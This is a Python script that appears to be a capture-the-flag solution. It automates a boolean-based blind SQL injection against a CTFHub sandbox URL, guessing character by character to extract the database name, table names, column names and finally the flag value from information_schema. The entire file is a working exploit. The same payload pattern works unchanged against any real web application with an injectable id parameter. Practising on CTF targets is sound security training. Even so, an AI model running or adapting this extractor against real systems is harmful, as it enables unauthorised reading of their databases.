import requests
import time

urlOPEN = 'http://challenge-80bbba4d1e9ce716.sandbox.ctfhub.com:10080/?id='
starOperatorTime = [] 
mark = 'query_success'
 
def database_name():
	name = ''
	for j in range(1,9):
		for i in 'sqcwertyuioplkjhgfdazxvbnm':
			url = urlOPEN+'if(substr(database(),%d,1)="%s",1,(select table_name from information_schema.tables))' %(j,i)
			# print(url+'%23')
			r = requests.get(url)
			if mark in r.text:
				name = name+i
				
				print(name)
				
				break
	print('database_name:',name)
	
		
	
database_name()
 
def table_name():
    list = []
    for k in range(0,4):
        name=''
        for j in range(1,9):
            for i in 'sqcwertyuioplkjhgfdazxvbnm':
                url = urlOPEN+'if(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)="%s",1,(select table_name from information_schema.tables))' %(k,j,i)
			    # print(url+'%23')
                r = requests.get(url)
                if mark in r.text:
                    name = name+i
                    break
        list.append(name)
    print('table_name:',list)

#start = time.time()
table_name()
#stop = time.time()
#starOperatorTime.append(stop-start)
#print("所用的平均时间： " + str(sum(starOperatorTime)/100))

def column_name():
    list = []
    for k in range(0,3): #判断表里最多有4个字段
        name=''
        for j in range(1,9): #判断一个 字段名最多有9个字符组成
            for i in 'sqcwertyuioplkjhgfdazxvbnm':
                url=urlOPEN+'if(substr((select column_name from information_schema.columns where table_name="flag"and table_schema= database() limit %d,1),%d,1)="%s",1,(select table_name from information_schema.tables))' %(k,j,i)
                r=requests.get(url)
                if mark in r.text:
                    name=name+i
                    break
        list.append(name)
    print ('column_name:',list)

column_name()

def get_data():
        name=''
        for j in range(1,50): #判断一个值最多有51个字符组成
            for i in range(48,126):
                url=urlOPEN+'if(ascii(substr((select flag from flag),%d,1))=%d,1,(select table_name from information_schema.tables))' %(j,i)
                r=requests.get(url)
                if mark in r.text:
                    name=name+chr(i)
                    print(name)
                    break
        print ('value:',name)
    
get_data()
